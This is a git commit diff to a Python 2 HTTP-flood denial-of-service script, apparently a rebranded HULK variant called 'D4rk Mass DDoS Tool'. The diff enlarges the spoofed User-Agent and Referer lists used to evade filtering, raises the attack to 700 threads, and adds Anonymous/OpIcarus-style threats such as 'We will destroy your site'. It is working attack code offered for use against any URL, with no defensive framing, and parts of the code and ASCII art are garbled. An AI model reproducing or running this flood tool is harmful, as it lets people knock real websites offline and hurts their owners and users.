7c1e7d8d84ae4c01bf52a8da9c1da06b95878d38
Mr.DDOS ATTACK <96361084+Xsarjame@users.noreply.github.com>
2022-02-17 15:10:01 +0700

    Update Chakri112.py

--- Chakri112.py
+++ Chakri112.py
@@ -806,12 +806,66 @@ def useragent_list():
 	return(headers_useragents)
 
 
-    # generates a referer array
+def inc_counter():
+	global request_counter
+	request_counter+=45
+
+def set_flag(val):
+	global flag
+	flag=val
+
+def set_safe():
+	global safe
+	safe=1
+	
+# generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+
+# generates a referer array
 def referer_list():
 	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://www.google.com/?q=')                                       ############################
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
+	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Anonymous_#
+	headers_referers.append('http://www.bing.com/search?q=')                                   #From Hackers To Hackers   #
+	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
+	headers_referers.append('http://www.ask.com/web?q=')
+	headers_referers.append('http://search.lycos.com/web/?q=')
+	headers_referers.append('http://busca.uol.com.br/web/?q=')
+	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
+	headers_referers.append('http://www.dmoz.org/search/search?q=')
+	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
+	headers_referers.append('http://yandex.ru/yandsearch?text=')
+	headers_referers.append('http://www.zhongsou.com/third?w=')
+	headers_referers.append('http://hksearch.timway.com/search.php?query=')
+	headers_referers.append('http://find.ezilon.com/search.php?q=')
+	headers_referers.append('http://www.sogou.com/web?query=')
+	headers_referers.append('http://api.duckduckgo.com/html/?q=')
+	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
+
+# generates a Keyword list	
+def keyword_list():
+        global keyword_top
+        keyword_top.append('D4rkN3t')
+
+
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
@@ -819,20 +873,21 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(65, 160)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print 'D4rk Mass DDoS Tool created by D4rkN3n'
+	print 'Facebook Profile: https://www.facebook.com/profile.php?id=100013355013276'
+	print 'Usage: d4rk.py (url)'
+	print 'Example: d4rk.py http://target.com/'
+	print "\a"
 
 print \
-"""
-                       ..._
-                     /MMMMM\
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+                      _..._
+                     /MMMMM?
                     (I8H#H8I)
                     (I8H#H8I)
                      \WWWWW/
@@ -844,13 +899,13 @@ print \
                       I._.I
                       I._.I
                       I.,.I
-                     / /#\ \
+                     / /#\ ?
                    .### # ###.
                _.~#############~,_
             _.####################._
-           /?/^   \##  #   ##/   ^++\
-          /#/      \##  #  #/      \#\
-         /+/        |       |       \+\
+           /?/^   \##  #   ##/   ^++|
+          /#/      \##  #  #/      \#|
+         /+/        |       |       \+}|
          +|         |  \ /  |         |+
          V          |  | |  |          V
                     |  | |  |
@@ -872,7 +927,7 @@ print \
      | |            |   |   |            | |
      J | ___...~~--'|   |   |`--~~...___ | L
      >-+<...___     |   |   |     ___...>+-<
-    /     __   `--~.L___L___J.~--'   __     \
+    /     __   `--~.L___L___J.~--'   __     |
    |      ` --.                  .-- \    /  |
     \_._/        \   // I \\   /        \_._/
       `--~.._     \__\\ I //__/     _..~--'
@@ -894,16 +949,8 @@ print \
                      \     /
                       \   /
                        \ /
-
 """""""""
 
-
-# def log(request):
-	# global request_counter
-	# print datetime.datetime.now(), 'REQUEST COUNT :', request_counter, '>>>', request.get_full_url()
-	# print request.get_method()
-	# print json.dumps(request.headers, indent=4, sort_keys=True)
-	# print dir(request)  # list lots of other stuff in Request
 	
 #http request
 def httpcall(url):
@@ -918,26 +965,28 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
+	request.add_header('Keep-Alive', random.randint(110,160))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			inc_counter()
-			# log(request)
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
-			print e.code
+			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+            
+ 			print '                                                                    '
+ 			print '***** We Are Anonymous *****'
+ 			print '***** Your website will be down *****'
+ 			print '                                                                    '
+                                                         
 			code=500
 	except urllib2.URLError, e:
-			print e.reason
+			#print e.reason
 			sys.exit()
-	# else:
-			# log(request)
-			# inc_counter()
-			# urllib2.urlopen(request)
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
 	return(code)		
 
 	
@@ -957,11 +1006,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent @" % (request_counter), datetime.datetime.now()
+			if (previous+150<request_counter) & (previous<>request_counter):
+				print "#~~~>D4rk Virus Sended: %d Sending more<~~~#" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- Royal Marketplace112 finish --", datetime.datetime.now()
+			print "\n ~>Stopping the mass DDoS Attack<~"
 
 #execute 
 if len(sys.argv) < 2:
@@ -972,18 +1021,26 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- I here O --", datetime.datetime.now()
+		print "Starting the D4rk Attack"
+		print "WTF U R DEAD"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('https?\://([^/]*)/?.*', url)
+		m = re.search('http\://([^/]*)/?.*', url)
 		host = m.group(1)
-		# print httpcall(url)
-		for i in range(500):
+		for i in range(700):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
 		t.start()
+
+####################################->
+#4312644bf54db17180c8a95add9fdc06####-->Hello admin
+#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will destroy your site 
+#5afc3c0f68ff47b53b485fcd53e898a9######---->OpIcarus
+#ff46a6b3100d11c29d4233c72f604a10#####--->Goodbye admin
+#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->D4rkN3t
+####################################->An0nYMouS
